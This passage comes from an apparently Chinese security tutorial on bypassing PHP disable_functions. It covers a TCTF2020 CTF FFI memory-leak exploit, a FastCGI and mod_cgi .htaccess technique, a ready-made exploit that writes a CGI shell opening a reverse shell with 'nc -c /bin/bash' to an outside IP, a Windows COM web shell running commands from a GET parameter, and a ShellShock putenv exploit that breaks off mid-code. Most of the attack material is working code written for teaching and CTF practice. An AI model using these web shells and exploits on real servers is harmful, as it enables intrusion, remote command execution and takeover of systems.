        title="image-20210129101638327" /></p>
<h3 id="tctf2020-noeasyphp">TCTF2020-noeasyphp</h3>
<p>这题在根目录给了<code>flag.c</code>和<code>flag.so</code>，PHP版本为7.4.7，开启了<code>FFI</code></p>
<p>但是禁用了<code>cdef</code>，也不知道<code>flag.c</code>中输出flag的函数名，没法直接调用</p>
<p>需要利用FFI进行内存泄露</p>
<p><a href="https://www.4hou.com/posts/p7BQ" target="_blank" rel="noopener noreffer">一叶飘零师傅的exp</a>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://pwnable.org:19261&#34;</span><span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;rh&#34;</span><span class="p">:</span><span class="s1">&#39;&#39;&#39;
</span><span class="s1">try {
</span><span class="s1">    $ffi=FFI::load(&#34;/flag.h&#34;);
</span><span class="s1">    //get flag
</span><span class="s1">    //$a = $ffi-&gt;flag_wAt3_uP_apA3H1();
</span><span class="s1">    //for($i = 0; $i &lt; 128; $i++){
</span><span class="s1">        echo $a[$i];
</span><span class="s1">    //}
</span><span class="s1">    $a = $ffi-&gt;new(&#34;char[8]&#34;, false);
</span><span class="s1">    $a[0] = &#39;f&#39;;
</span><span class="s1">    $a[1] = &#39;l&#39;;
</span><span class="s1">    $a[2] = &#39;a&#39;;
</span><span class="s1">    $a[3] = &#39;g&#39;;
</span><span class="s1">    $a[4] = &#39;f&#39;;
</span><span class="s1">    $a[5] = &#39;l&#39;;
</span><span class="s1">    $a[6] = &#39;a&#39;;
</span><span class="s1">    $a[7] = &#39;g&#39;;
</span><span class="s1">    $b = $ffi-&gt;new(&#34;char[8]&#34;, false);
</span><span class="s1">    $b[0] = &#39;f&#39;;
</span><span class="s1">    $b[1] = &#39;l&#39;;
</span><span class="s1">    $b[2] = &#39;a&#39;;
</span><span class="s1">    $b[3] = &#39;g&#39;;
</span><span class="s1">    $newa = $ffi-&gt;cast(&#34;void*&#34;, $a);
</span><span class="s1">    var_dump($newa);
</span><span class="s1">    $newb = $ffi-&gt;cast(&#34;void*&#34;, $b);
</span><span class="s1">    var_dump($newb);
</span><span class="s1">    
</span><span class="s1">    $addr_of_a = FFI::new(&#34;unsigned long long&#34;);
</span><span class="s1">    FFI::memcpy($addr_of_a, FFI::addr($newa), 8);
</span><span class="s1">    var_dump($addr_of_a);
</span><span class="s1">    
</span><span class="s1">    $leak = FFI::new(FFI::arrayType($ffi-&gt;type(&#39;char&#39;), [102400]), false);
</span><span class="s1">    FFI::memcpy($leak, $newa-0x20000, 102400);
</span><span class="s1">    $tmp = FFI::string($leak,102400);
</span><span class="s1">    var_dump($tmp);
</span><span class="s1">   
</span><span class="s1">    //var_dump($leak);
</span><span class="s1">    //$leak[0] = 0xdeadbeef;
</span><span class="s1">    //$leak[1] = 0x61616161;
</span><span class="s1">    //var_dump($a);
</span><span class="s1">    //FFI::memcpy($newa-0x8, $leak, 128*8);
</span><span class="s1">    //var_dump($a);
</span><span class="s1">    //var_dump(777);
</span><span class="s1">} catch (FFI\Exception $ex) {
</span><span class="s1">    echo $ex-&gt;getMessage(), PHP_EOL;
</span><span class="s1">}
</span><span class="s1">var_dump(1);
</span><span class="s1">&#39;&#39;&#39;</span><span class="p">}</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>

<span class="nb">print</span><span class="p">((</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>然后读flag：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$ffi</span><span class="o">=</span><span class="nx">FFI</span><span class="o">::</span><span class="na">load</span><span class="p">(</span><span class="s2">&#34;/flag.h&#34;</span><span class="p">);</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nx">FFI</span><span class="o">::</span><span class="na">string</span><span class="p">(</span><span class="nv">$ffi</span><span class="o">-&gt;</span><span class="na">flag_wAt3_uP_apA3H1</span><span class="p">());</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="cgi">CGI</h2>
<h3 id="简介-1">简介</h3>
<p><strong>CGI</strong>(<code>Common Gateway Interface:通用网关接口</code>)是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互,还可通过数据库API 与数据库服务器等外部数据源进行通信,从数据库服务器中获取数据。</p>
<ul>
<li>当用户访问我们的 Web 应用时，会发起一个 HTTP 请求。最终 Web 服务器接收到这个请求。</li>
<li>Web 服务器创建一个新的 CGI 进程。在这个进程中，将 HTTP 请求数据已一定格式解析出来，并通过标准输入和环境变量传入到 URL 指定的 CGI 程序。</li>
<li>Web 应用程序处理完成后将返回数据写入到标准输出中，Web 服务器进程则从标准输出流中读取到响应，并采用 HTTP 协议返回给用户响应。</li>
</ul>
<p>但是<code>CGI协议</code>对于每个请求都需要重新 fork 出一个 CGI 进程，处理完成后关闭，这在高并发时会占用大量服务器资源，所以基于 <code>CGI</code> 协议的基础上做了改进便有了 <code>FastCGI</code> 协议，它是一种常驻型的 CGI 协议。</p>
<h3 id="fastcgi">Fastcgi</h3>
<p><code>FastCGI</code>的主要目的就是，将<code>webserver</code>和动态语言的执行分开为两个不同的常驻进程，当<code>webserver</code>接收到动态脚本的请求，就通过fcgi协议将请求通过网络转发给fcgi进程，由fcgi进程进行处理之后，再将结果传送给<code>webserver</code>，然后<code>webserver</code>再输出给浏览器。这种模型由于不用每次请求都重新启动一次cgi，也不用嵌入脚本解析器到<code>webserver</code>中去，因此可伸缩性很强，一旦动态脚本请求量增加，就可以将后端fcgi进程单独设立一个集群提供服务，很大的增加了可维护性，这也是为什么fcgi等类似模式如此流行的原因之一。</p>
<h3 id="fastcginginxphp-fpm">Fastcgi(Nginx+php-fpm)</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg"
        data-srcset="https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg, https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg"
        title="https://gitee.com/leonsec/images/raw/master/224121kkjhzlk8qo19uhoo.jpg" /></p>
<p><code>PHP-FPM</code>即<code>PHP-FastCGI Process Manager</code></p>
<p><code>PHP-FPM</code>是<code>FastCGI</code>的实现，并提供了进程管理的功能。</p>
<p>进程包含 master 进程和 worker 进程两种进程</p>
<p>master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方</p>
<p><code>Nginx</code>与<code>php-fpm</code>之间使用<code>Fastcgi</code>协议通信，目前越来越多的集群将fcgi直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成webserver，让fcgi执行我们想执行的脚本内容</p>
<p><code>php-fpm</code>默认监听<code>9000</code>端口</p>
<p>可以在<code>Nginx</code>的配置文件中看到：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini">    <span class="na">location ~ \.php$ {</span>
        <span class="na">fastcgi_pass   phpfpm:9000;</span>
        <span class="na">fastcgi_index  index.php;</span>
        <span class="na">fastcgi_param  REDIRECT_STATUS    200;</span>
        <span class="na">fastcgi_param  SCRIPT_FILENAME    /var/www/html$fastcgi_script_name;</span>
        <span class="na">...</span>
    <span class="na">}</span>
</code></pre></td></tr></table>
</div>
</div><p>具体的关于<code>Fastcgi</code>协议以及攻击<code>php-fpm</code>原理的解析这里就不过多描述</p>
<p>参考p神的exp: <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener noreffer">Fastcgi PHP-FPM Client &amp;&amp; Code Execution</a></p>
<h3 id="mod-cgiapache_mod_php">Mod CGI(Apache_mod_php)</h3>
<p>此方式为 mod_php 通过嵌入 PHP 解释器到 Apache 进程中对php文件进行解析</p>
<p>利用条件：</p>
<ul>
<li>Apache + PHP (apache 使用 apache_mod_php)</li>
<li>Apache 开启了 <code>cgi</code>, <code>rewrite</code></li>
<li>Web 目录给了 <code>AllowOverride</code> 权限</li>
</ul>
<p>介绍一下<code>mod_cgi</code>：<a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html" target="_blank" rel="noopener noreffer">（mod_cgi - Apache HTTP Server Version 2.4）</a></p>
<p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为<code>CGI脚本</code>对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为<code>CGI脚本</code>，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中。</p>
<p>这里提到了<code>CGI脚本</code>，<code>CGI脚本</code>简单说来便是放在服务器上的可执行程序，CGI编程没有特定的语言，C语言、linux shell、perl、vb等等都可以进行CGI编程，使用linux shell脚本编写的cgi程序便可以执行系统命令</p>
<p>所以当Apache 开启了 <code>cgi</code>, <code>rewrite</code>时，我们可以利用<code>.htaccess</code>文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用<code>.htaccess</code>文件进行配置：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="na">Options +ExecCGI</span>
<span class="na">AddHandler cgi-script .aaa</span>
</code></pre></td></tr></table>
</div>
</div><p>然后准备<code>shell.aaa</code>作为cgi程序执行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span>echo<span class="p">;</span>whoami<span class="p">;</span>uname -a
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210128234412450.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210128234412450.png, https://gitee.com/leonsec/images/raw/master/image-20210128234412450.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210128234412450.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210128234412450.png"
        title="image-20210128234412450" /></p>
<p>都上传至靶机后，发现直接访问500，因为需要给<code>shell.aaa</code>添加可执行权限，<code>chmod(&quot;shell.aaa&quot;,0777);</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210128235459271.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210128235459271.png, https://gitee.com/leonsec/images/raw/master/image-20210128235459271.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210128235459271.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210128235459271.png"
        title="image-20210128235459271" /></p>
<p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/apache_mod_cgi/exp.php" target="_blank" rel="noopener noreffer">l3m0n师傅</a>的exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;nc -c &#39;/bin/bash&#39; 172.16.15.1 4444&#34;</span><span class="p">;</span> <span class="c1">//command to be executed
</span><span class="c1"></span><span class="nv">$shellfile</span> <span class="o">=</span> <span class="s2">&#34;#!/bin/bash</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">//using a shellscript
</span><span class="c1"></span><span class="nv">$shellfile</span> <span class="o">.=</span> <span class="s2">&#34;echo -ne </span><span class="se">\&#34;</span><span class="s2">Content-Type: text/html</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">n</span><span class="se">\&#34;\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">//header is needed, otherwise a 500 error is thrown when there is output
</span><span class="c1"></span><span class="nv">$shellfile</span> <span class="o">.=</span> <span class="s2">&#34;</span><span class="si">$cmd</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">//executing $cmd
</span><span class="c1"></span><span class="k">function</span> <span class="nf">checkEnabled</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$condition</span><span class="p">,</span> <span class="nv">$yes</span><span class="p">,</span> <span class="nv">$no</span><span class="p">)</span> <span class="c1">//this surely can be shorter
</span><span class="c1"></span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$text</span><span class="s2">: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$condition</span> <span class="o">?</span> <span class="nv">$yes</span> <span class="o">:</span> <span class="nv">$no</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;checked&#39;</span><span class="p">]))</span> <span class="p">{</span>
	<span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">SetEnv HTACCESS on&#34;</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span> <span class="c1">//Append it to a .htaccess file to see whether .htaccess is allowed
</span><span class="c1"></span>	<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: &#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;?checked=true&#39;</span><span class="p">);</span> <span class="c1">//execute the script again to see if the htaccess test worked
</span><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nv">$modcgi</span> <span class="o">=</span> <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;mod_cgi&#39;</span><span class="p">,</span> <span class="nx">apache_get_modules</span><span class="p">());</span> <span class="c1">// mod_cgi enabled?
</span><span class="c1"></span>	<span class="nv">$writable</span> <span class="o">=</span> <span class="nx">is_writable</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> <span class="c1">//current dir writable?
</span><span class="c1"></span>	<span class="nv">$htaccess</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTACCESS&#39;</span><span class="p">]);</span> <span class="c1">//htaccess enabled?
</span><span class="c1"></span>	<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Mod-Cgi enabled&#34;</span><span class="p">,</span> <span class="nv">$modcgi</span><span class="p">,</span> <span class="s2">&#34;Yes&#34;</span><span class="p">,</span> <span class="s2">&#34;No&#34;</span><span class="p">);</span>
	<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Is writable&#34;</span><span class="p">,</span> <span class="nv">$writable</span><span class="p">,</span> <span class="s2">&#34;Yes&#34;</span><span class="p">,</span> <span class="s2">&#34;No&#34;</span><span class="p">);</span>
	<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;htaccess working&#34;</span><span class="p">,</span> <span class="nv">$htaccess</span><span class="p">,</span> <span class="s2">&#34;Yes&#34;</span><span class="p">,</span> <span class="s2">&#34;No&#34;</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$modcgi</span> <span class="o">&amp;&amp;</span> <span class="nv">$writable</span> <span class="o">&amp;&amp;</span> <span class="nv">$htaccess</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">echo</span> <span class="s2">&#34;Error. All of the above must be true for the script to work!&#34;</span><span class="p">;</span> <span class="c1">//abort if not
</span><span class="c1"></span>	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Backing up .htaccess&#34;</span><span class="p">,</span> <span class="nx">copy</span><span class="p">(</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;.htaccess.bak&#34;</span><span class="p">),</span> <span class="s2">&#34;Suceeded! Saved in .htaccess.bak&#34;</span><span class="p">,</span> <span class="s2">&#34;Failed!&#34;</span><span class="p">);</span> <span class="c1">//make a backup, cause you never know.
</span><span class="c1"></span>		<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Write .htaccess file&#34;</span><span class="p">,</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span> <span class="s2">&#34;Options +ExecCGI</span><span class="se">\n</span><span class="s2">AddHandler cgi-script .dizzle&#34;</span><span class="p">),</span> <span class="s2">&#34;Succeeded!&#34;</span><span class="p">,</span> <span class="s2">&#34;Failed!&#34;</span><span class="p">);</span> <span class="c1">//.dizzle is a nice extension
</span><span class="c1"></span>		<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Write shell file&#34;</span><span class="p">,</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;shell.dizzle&#39;</span><span class="p">,</span> <span class="nv">$shellfile</span><span class="p">),</span> <span class="s2">&#34;Succeeded!&#34;</span><span class="p">,</span> <span class="s2">&#34;Failed!&#34;</span><span class="p">);</span> <span class="c1">//write the file
</span><span class="c1"></span>		<span class="nx">checkEnabled</span><span class="p">(</span><span class="s2">&#34;Chmod 777&#34;</span><span class="p">,</span> <span class="nx">chmod</span><span class="p">(</span><span class="s2">&#34;shell.dizzle&#34;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">),</span> <span class="s2">&#34;Succeeded!&#34;</span><span class="p">,</span> <span class="s2">&#34;Failed!&#34;</span><span class="p">);</span> <span class="c1">//rwx
</span><span class="c1"></span>		<span class="k">echo</span> <span class="s2">&#34;Executing the script now. Check your listener &lt;img src = &#39;shell.dizzle&#39; style = &#39;display:none;&#39;&gt;&#34;</span><span class="p">;</span> <span class="c1">//call the script
</span><span class="c1"></span>	<span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><h2 id="windows-com">Windows COM</h2>
<blockquote>
<p>COM组件它最早的设计意图是，跨语言实现程序组件的复用COM组件由以Win 32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成。遵循COM规范编写出来的组件将能够满足对组件架构的所有要求。COM组件可以给应用程序、操作系统以及其他组件提供服务；自定义的COM组件可以在运行时刻同其他组件连接起来构成某个应用程序；COM组件可以动态的插入或卸出应用。</p>
</blockquote>
<p>利用条件：</p>
<ul>
<li><code>com.allow_dcom = true</code></li>
<li><code>extension=php_com_dotnet.dll</code></li>
</ul>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$command</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
<span class="nv">$wsh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;WScript.shell&#39;</span><span class="p">);</span> <span class="c1">// 生成一个COM对象　Shell.Application也能
</span><span class="c1"></span><span class="nv">$exec</span> <span class="o">=</span> <span class="nv">$wsh</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s2">&#34;cmd /c&#34;</span><span class="o">.</span><span class="nv">$command</span><span class="p">);</span> <span class="c1">//调用对象方法来执行命令
</span><span class="c1"></span><span class="nv">$stdout</span> <span class="o">=</span> <span class="nv">$exec</span><span class="o">-&gt;</span><span class="na">StdOut</span><span class="p">();</span>
<span class="nv">$stroutput</span> <span class="o">=</span> <span class="nv">$stdout</span><span class="o">-&gt;</span><span class="na">ReadAll</span><span class="p">();</span>
<span class="k">echo</span> <span class="nv">$stroutput</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129092823592.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129092823592.png, https://gitee.com/leonsec/images/raw/master/image-20210129092823592.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129092823592.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129092823592.png"
        title="image-20210129092823592" /></p>
<h2 id="shellshock">ShellShock</h2>
<p>目标OS如果存在Bash破壳（<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271" target="_blank" rel="noopener noreffer">CVE-2014-6271</a>）漏洞，就可以利用<code>mail</code>、<code>error_log</code>等可以创建子进程的函数调用<code>bash</code>，触发ShellShock漏洞绕过disable_function</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">runcmd</span><span class="p">(</span><span class="nv">$c</span><span class="p">){</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;/&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;putenv&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;mail&#39;</span><span class="p">))){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nx">readlink</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">),</span> <span class="s2">&#34;bash&#34;</span><span class="p">)</span><span class="o">!=</span><span class="k">FALSE</span><span class="p">){</span>
      <span class="nv">$tmp</span><span class="o">=</span><span class="nx">tempnam</span><span class="p">(</span><span class="nx">sys_get_temp_dir</span><span class="p">(),</span> <span class="s1">&#39;as&#39;</span><span class="p">);</span>
      <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$c</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">error_log</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;-bv&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Not vuln (not bash)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$output</span><span class="o">!=</span><span class="s2">&#34;&#34;</span><span class="p">){</span>
      <span class="k">print</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="k">print</span><span class="p">(</span><span class="s2">&#34;No output, or not vuln.&#34;</span><span class="p">);</span>
    <span class="p">}</span>
